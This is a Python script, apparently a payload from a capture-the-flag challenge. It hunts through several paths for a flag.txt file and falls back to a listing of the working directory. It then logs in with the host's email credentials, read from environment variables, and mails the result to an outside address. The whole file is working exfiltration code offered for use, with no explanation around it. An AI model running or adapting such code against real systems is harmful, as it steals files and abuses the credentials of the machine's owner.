import os
import smtplib
from email.message import EmailMessage

# Try multiple locations for the flag
flag_content = ""
possible_paths = [
    'flag.txt',
    './flag.txt',
    '/app/flag.txt',
    os.path.join(os.getcwd(), 'flag.txt'),
    os.path.join(os.path.dirname(__file__), 'flag.txt')
]

for path in possible_paths:
    try:
        with open(path, 'r') as f:
            flag_content = f"Flag from {path}:\n{f.read()}"
        break
    except:
        continue

# If no flag found, send directory listing
if not flag_content:
    flag_content = f"CWD: {os.getcwd()}\nFiles: {os.listdir('.')}"

# Send result back
recipient = "user-zdhsk86n@skillissue.it"
company_email = os.getenv('EMAIL_USERNAME') + "@" + os.getenv('EMAIL_DOMAIN')
password = os.getenv('EMAIL_PASSWORD')

msg = EmailMessage()
msg['From'] = company_email
msg['To'] = recipient
msg['Subject'] = 'FLAG'
msg.set_content(flag_content)

with smtplib.SMTP_SSL("mail", 465) as smtp:
    smtp.login(company_email, password)
    smtp.send_message(msg)
